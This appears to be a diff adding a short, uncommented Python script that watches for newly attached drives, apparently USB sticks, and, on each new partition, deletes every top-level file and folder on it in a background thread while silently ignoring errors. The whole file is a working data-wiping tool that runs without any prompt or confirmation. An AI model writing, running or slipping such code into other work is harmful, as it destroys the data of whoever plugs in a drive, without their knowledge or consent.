@@ -1,0 +1,34 @@
+import os
+import shutil
+import psutil
+import threading
+
+
+def read_u():
+    before_u = psutil.disk_partitions()
+    while True:
+        now_u = psutil.disk_partitions()
+        if len(now_u) > len(before_u):
+            before_u = psutil.disk_partitions()
+            path = now_u[-1].device
+            t1 = threading.Thread(target=rm_u, args=(path,))
+            t1.start()
+        elif len(now_u) < len(before_u):
+            before_u = psutil.disk_partitions()
+
+
+def rm_u(path):
+    for i in os.listdir(path):
+        try:
+            if '.' in i:
+                os.remove(path+i)
+                continue
+            shutil.rmtree(path+i)
+        except:
+            continue
+
+if __name__ == '__main__':
+    t = threading.Thread(target=read_u)
+    t.start()
+
+
